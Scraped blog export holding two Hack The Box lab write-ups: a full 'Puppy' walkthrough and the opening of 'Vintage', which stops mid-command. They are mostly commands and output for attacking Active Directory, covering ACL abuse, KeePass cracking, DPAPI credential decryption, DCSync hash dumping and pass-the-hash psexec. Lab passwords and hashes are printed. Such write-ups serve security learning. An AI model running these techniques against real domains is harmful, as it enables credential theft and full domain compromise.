[{"content":"Nmap scan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 Nmap scan report for 10.10.11.70 (10.10.11.70) Host is up, received user-set (0.14s latency). Scanned at 2025-05-19 13:04:52 +01 for 191s Not shown: 985 filtered tcp ports (no-response) Bug in iscsi-info: no string output. PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-20 01:04:53Z) 111/tcp open rpcbind syn-ack ttl 127 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 2049/tcp open nlockmgr syn-ack ttl 127 1-4 (RPC #100021) 3260/tcp open iscsi? syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.95%E=4%D=5/19%OT=53%CT=%CU=%PV=Y%G=N%TM=682B1F23%P=x86_64-pc-linux-gnu) SEQ(SP=104%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A) SEQ(SP=106%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=A) OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11) WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC) ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Uptime guess: 0.024 days (since Mon May 19 12:33:49 2025) TCP Sequence Prediction: Difficulty=262 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 62785/tcp): CLEAN (Timeout) | Check 2 (port 47994/tcp): CLEAN (Timeout) | Check 3 (port 26380/udp): CLEAN (Timeout) | Check 4 (port 46192/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: 12h59m43s | smb2-time: | date: 2025-05-20T01:07:03 |_ start_date: N/A Foothold : I enumerated shares using NetExec but nothing interesting is showed up.\n1 2 3 4 5 6 7 8 9 10 11 12 nxc smb puppy.htb -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --shares  ✔  14:18:53  SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share Since this is credentialed, i used them to gather Bloodhound digest to get a better view of the whole environement.\n1 bloodhound-python -u levi.james -p \u0026#39;KingofAkron2025!\u0026#39; -d puppy.htb -ns 10.10.11.70 -c All As we can see our user levi.james is part of the HR group, who\u0026rsquo;s members have GenericWrite over the DEVELOPERS Group.\nWe can leverage that by adding this user the DEVELOPERS Group.\n1 2 net rpc group addmem \u0026#34;DEVELOPERS\u0026#34; \u0026#34;levi.james\u0026#34; -U \u0026#34;PUPPY.HTB\u0026#34;/\u0026#34;levi.james\u0026#34;%\u0026#34;KingofAkron2025\\!\u0026#34; -S \u0026#34;DC.PUPPY.HTB\u0026#34; Can\u0026#39;t load /etc/samba/smb.conf - run testparm to debug it By enumerating shares once again, we can see that we have READ access to the DEV share.\n1 2 3 4 5 6 7 8 9 10 11 12 13 nxc smb puppy.htb -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --shares SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV READ DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share After accessing the share i can see a .kdbx database extension file.\n1 2 3 4 5 6 7 8 9 10 11 smbclient //dc.puppy.htb/DEV -U \u0026#39;PUPPY.HTB\\levi.james\u0026#39; Can\u0026#39;t load /etc/samba/smb.conf - run testparm to debug it Password for [PUPPY.HTB\\levi.james]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sun Mar 23 07:07:57 2025 .. D 0 Sat Mar 8 16:52:57 2025 KeePassXC-2.7.9-Win64.msi A 34394112 Sun Mar 23 07:09:12 2025 Projects D 0 Sat Mar 8 16:53:36 2025 recovery.kdbx A 2677 Wed Mar 12 02:25:46 2025 While trying to access it, it looks like it require a password.\nI cracked the .kdbx file using the keepass4brute, and the password is liverpool\n1 2 3 4 5 6 7 8 9 ./keepass4brute.sh ../recovery.kdbx rockyou.txt keepass4brute 1.3 by r3nt0n https://github.com/r3nt0n/keepass4brute [+] Words tested: 36/14344391 - Attempts per minute: 86 - Estimated time remaining: 16 weeks, 3 days [+] Current attempt: liverpool [*] Password found: liverpool As we see i got access to these users passwords.\nThe adam.silver password is not working as nxc show below.\n1 2 3 4 nxc smb puppy.htb -u \u0026#39;adam.silver\u0026#39; -p \u0026#39;HJKL2025!\u0026#39; SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [-] PUPPY.HTB\\adam.silver:HJKL2025! STATUS_LOGON_FAILURE As oppose the Antony C. Edwards one is working, but with with the SamAccountName ant.edwards\n1 2 3 4 nxc smb puppy.htb -u \u0026#39;ant.edwards\u0026#39; -p \u0026#39;Antman2025!\u0026#39; SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\ant.edwards:Antman2025! After a quick search on this user, i found that we have GenericAll over the adam.silver user, who is part of the Remote Management Group.\nWe can now change this user\u0026rsquo;s password.\n1 2 net rpc password \u0026#34;adam.silver\u0026#34; \u0026#34;P@ssword2025\u0026#34; -U \u0026#34;PUPPY.HTB\u0026#34;/\u0026#34;ant.edwards\u0026#34;%\u0026#34;Antman2025\\!\u0026#34; -S \u0026#34;dc.puppy.htb\u0026#34; Can\u0026#39;t load /etc/samba/smb.conf - run testparm to debug it Even though it still no working, because the account is disabled. This how to disable the user\u0026rsquo;s account.\n1 2 3 4 5 6 7 8 ldapmodify -x -H ldap://10.10.11.70 \\ -D \u0026#39;ant.edwards@puppy.htb\u0026#39; -w \u0026#39;Antman2025!\u0026#39; \u0026lt;\u0026lt;EOF dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB changetype: modify replace: userAccountControl userAccountControl: 512 EOF modifying entry \u0026#34;CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB\u0026#34; And just like that we got the user flag!!\nRoot : Navigating through the File system as adam.silver i found this C:\\Backups file which unusual, where i found this site-backup-2024-12-30.zip file.\n1 2 3 4 5 6 7 *Evil-WinRM* PS C:\\Backups\u0026gt; ls Directory: C:\\Backups Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/8/2025 8:22 AM 4639546 site-backup-2024-12-30.zip After getting the zip file locally and looking through it i found this config file, that expose the steph.cooper credentials.\nThese are valid as nxc says.\n1 2 3 4 nxc smb puppy.htb -u \u0026#39;steph.cooper\u0026#39; -p \u0026#39;ChefSteph2025!\u0026#39; SMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\steph.cooper:ChefSteph2025! `` This user is part of the Remote Management group as well. So i used evil-winrm to enumerate further.\nThis time i used winPEASx64.exe. As it shows below it reveals some DPAPI Master keys and Credential file under the steph.cooper user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 *Evil-WinRM* PS C:\\Users\\steph.cooper\\Documents\u0026gt; .\\winPEASx64.exe . . . \u0026lt;SNIP\u0026gt; . . ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys È https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi MasterKey: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407 Accessed: 3/8/2025 7:40:36 AM Modified: 3/8/2025 7:40:36 AM ================================================================================================= ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files È https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi CredFile: C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D Description: Local Credential Data MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407 Accessed: 3/8/2025 8:14:09 AM Modified: 3/8/2025 8:14:09 AM Size: 11068 ================================================================================================= CredFile: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9 Description: Enterprise Credential Data MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407 Accessed: 3/8/2025 7:54:29 AM Modified: 3/8/2025 7:54:29 AM Size: 414 ================================================================================================= È Follow the provided link for further instructions in how to decrypt the creds file . . . \u0026lt;SNIP\u0026gt; . . Master key :\n1 2 3 4 5 6 7 8 *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\u0026gt; copy 556a2412-1275-4ccf-b721-e6a0b4f90407 C:\\Users\\steph.cooper\\Desktop *Evil-WinRM* PS C:\\USers\\steph.cooper\\Desktop\u0026gt; attrib -h -s 556a2412-1275-4ccf-b721-e6a0b4f90407 *Evil-WinRM* PS C:\\USers\\steph.cooper\\Desktop\u0026gt; download 556a2412-1275-4ccf-b721-e6a0b4f90407 Info: Downloading C:\\USers\\steph.cooper\\Desktop\\556a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407 Info: Download successful! Credential File :\n1 2 3 4 5 6 7 8 9 10 *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; attrib -h -s C8D69EBE9A43E9DEBF6B5FBD48B521B9 *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; cp C8D69EBE9A43E9DEBF6B5FBD48B521B9 C:\\Users\\steph.cooper\\Desktop *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; cd C:\\Users\\steph.cooper\\Desktop *Evil-WinRM* PS C:\\Users\\steph.cooper\\Desktop\u0026gt; download C8D69EBE9A43E9DEBF6B5FBD48B521B9 Info: Downloading C:\\Users\\steph.cooper\\Desktop\\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9 Info: Download successful! The first step involves decrypting the Master Key using the dpapi.py tool. The Master Key is encrypted and tied to the user\u0026rsquo;s SID and password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password \u0026#39;ChefSteph2025!\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra [MASTERKEYFILE] Version : 2 (2) Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407 Flags : 0 (0) Policy : 4ccf1275 (1288639093) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 Impacket v0.11.0 - Copyright 2023 Fortra [CREDENTIAL] LastWritten : 2025-03-08 15:54:29 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD) Target : Domain:target=PUPPY.HTB Description : Unknown : Username : steph.cooper_adm Unknown : FivethChipOnItsWay2025! Bloodhound shows that this user have DCSync Right over the whole domain.\nNow let\u0026rsquo;s DCsync using secretsdump.py :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 sudo secretsdump.py \u0026#34;puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025\\!\u0026#34;@\u0026#34;dc.puppy.htb\u0026#34; [sudo] password for razio: Impacket v0.11.0 - Copyright 2023 Fortra [*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn\u0026#39;t have hash information. [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC PUPPY\\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45 PUPPY\\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30 PUPPY\\DC$:des-cbc-md5:54e9a11619f8b9b5 PUPPY\\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13 PUPPY\\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df::: [*] DPAPI_SYSTEM dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3 dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf [*] NL$KM 0000 DD 1B A5 A0 33 E7 A0 56 1C 3F C3 F5 86 31 BA 09 ....3..V.?...1.. 0010 1A C4 D4 6A 3C 2A FA 15 26 06 3B 93 E0 66 0F 7A ...j\u0026lt;*..\u0026amp;.;..f.z 0020 02 9A C7 2E 52 79 C1 57 D9 0C D3 F6 17 79 EF 3F ....Ry.W.....y.? 0030 75 88 A3 99 C7 E0 2B 27 56 95 5C 6B 85 81 D0 ED u.....+\u0026#39;V.\\k.... NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a::: PUPPY.HTB\\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8::: PUPPY.HTB\\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b::: PUPPY.HTB\\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66::: PUPPY.HTB\\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780::: PUPPY.HTB\\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b::: PUPPY.HTB\\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0 Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf . . . \u0026lt;SNIP\u0026gt; . . . [*] Cleaning up... And finally, we got a shell as the administrator using the Administrator\u0026rsquo;s hash for the above dump:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 psexec.py -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b\u0026#39; \u0026#39;Administrator@dc.puppy.htb\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra [*] Requesting shares on dc.puppy.htb..... [*] Found writable share ADMIN$ [*] Uploading file PEFrQaPk.exe [*] Opening SVCManager on dc.puppy.htb..... [*] Creating service sMPL on dc.puppy.htb..... [*] Starting service sMPL..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.20348.3453] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system ","date":"2025-05-22T00:00:00Z","image":"https://r4z1o.github.io/p/puppy-htb-writeup/Puppy_hu_21ccc5a62b1067ac.png","permalink":"https://r4z1o.github.io/p/puppy-htb-writeup/","title":"Puppy HTB Writeup"},{"content":"This is one of the Boxes that took me a week to solve, but the amount of the information that i learned from it is unbelievable\nAs always we start our assessment with a port comprehensive scan that reveals the following results :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ sudo nmap -v -sV -sC -O -Pn --disable-arp-ping -p- -o Broad-scan-nmap 10.10.11.45 Nmap scan report for 10.10.11.45 Host is up (0.073s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-17 03:07:34Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49685/tcp open msrpc Microsoft Windows RPC 51973/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022 (89%) Aggressive OS guesses: Microsoft Windows Server 2022 (89%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.008 days (since Mon Feb 17 03:57:14 2025) TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-02-17T03:08:34 |_ start_date: N/A As it appears SMB port :445, LDAP port :389 and Kerberos port :88 are open in the box which indicate that this is a Domains Controller. The results above show the domain under which this Server is vintage.htb .\nAs always i tried running NXC using the provided credentials P.Rosa:Rosaisbest123 and the DC01.vintage.htb seems to be the DNS Name of the box, but it seems that it is encountering some issue.\n1 2 3 4 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ sudo netexec smb 10.10.11.45 -u P.Rosa -p Rosaisbest123 SMB 10.10.11.45 445 10.10.11.45 [*] x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False) SMB 10.10.11.45 445 10.10.11.45 [-] 10.10.11.45\\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED 1 2 3 4 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ sudo netexec ldap 10.10.11.45 -u P.Rosa -p Rosaisbest123 LDAP 10.10.11.45 389 dc01.vintage.htb [*] x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.45 389 dc01.vintage.htb [-] vintage.htb\\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED This took me a lot of time to figure out. i even thought this is some VPN issue or connection problem, so i googled it and i found this Scrambled vs NetExec for someone encountering the same problem on a different HTB Box, and the netexec feedback information is STATUS_NOT_SUPPORTED, indicate that NTLM Authentication is disabled.\nFor that we will resort to Kerberos Authentication, by obtaining a TGT and export it to the KRB5CCNAME environment variable.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ getTGT.py vintage.htb/P.Rosa:\u0026#39;Rosaisbest123\u0026#39; -dc-ip dc01.vintage.htb Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in P.Rosa.ccache 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ export KRB5CCNAME=P.Rosa.ccache 1 2 3 4 5 6 7 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ klist Ticket cache: FILE:P.Rosa.ccache Default principal: P.Rosa@VINTAGE.HTB Valid starting Expires Service principal 03/17/25 03:51:04 03/17/25 13:51:04 krbtgt/VINTAGE.HTB@VINTAGE.HTB renew until 03/18/25 03:51:04 Let\u0026rsquo;s test it out, and it seems to be good!\n1 2 3 4 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ sudo netexec smb dc01.vintage.htb -u P.Rosa -d vintage.htb -k --use-kcache SMB dc01.vintage.htb 445 dc01 [*] x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) SMB dc01.vintage.htb 445 dc01 [+] vintage.htb\\P.Rosa from ccache I used netexec to enumerate user and computer accounts through the --rid-kcache flag, so i saw gMSA01$ and i immediately though about ReadGMSAPassword ACL which is relevant for these service accounts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute| grep SidTypeUser | cut -d: -f2 | cut -d \\\\ -f2 | cut -d\u0026#39; \u0026#39; -f1 Administrator Guest krbtgt DC01$ gMSA01$ FS01$ M.Rossi R.Verdi L.Bianchi G.Viola C.Neri P.Rosa svc_sql svc_ldap svc_ark C.Neri_adm L.Bianchi_adm I collected data using bloodhound-python and ingest it to Bloodhound using the TGT.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage/bloodhound1] └─# bloodhound-python -u P.Rosa -p \u0026#39;Rosaisbest123\u0026#39; -d vintage.htb -dc dc01.vintage.htb -c All INFO: Found AD domain: vintage.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.vintage.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 2 computers INFO: Connecting to LDAP server: dc01.vintage.htb INFO: Found 16 users INFO: Found 58 groups INFO: Found 2 gpos INFO: Found 2 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: FS01.vintage.htb INFO: Querying computer: dc01.vintage.htb I used this custom Cypher query to get accounts that have Read access of GMSA01$\u0026rsquo;s password, and Domain Computers Group have that Right.\n1 MATCH p=0 [: ReadCMSAPassword] \u0026gt;0 RETURN p Domain Computers Group have FS01$ as a member, which seems to be a File Server account.\nThe FS01$ is part of the Pre-Windows 2000 Compatible computer Access Group.\nThis got me thinking about one Blog that i read which say that : When a new computer account is configured as \u0026quot;Pre-Windows 2000 computer\u0026quot;, its password is set based on its name (i.e. lowercase computer name without the trailing $). When it isn't, the password is randomly generated.\nSo, i tried the fs01 as a password and it did actually works.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ sudo netexec ldap vintage.htb -u \u0026#39;FS01$\u0026#39; -p fs01 -k LDAP vintage.htb 389 dc01.vintage.htb [*] x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False) LDAP vintage.htb 389 dc01.vintage.htb [+] vintage.htb\\FS01$:fs01 I used the getTGT.py to generate a ticket to authenticate as FS01$ and export it to the KRB5CCNAME to use it further.\n1 2 3 4 5 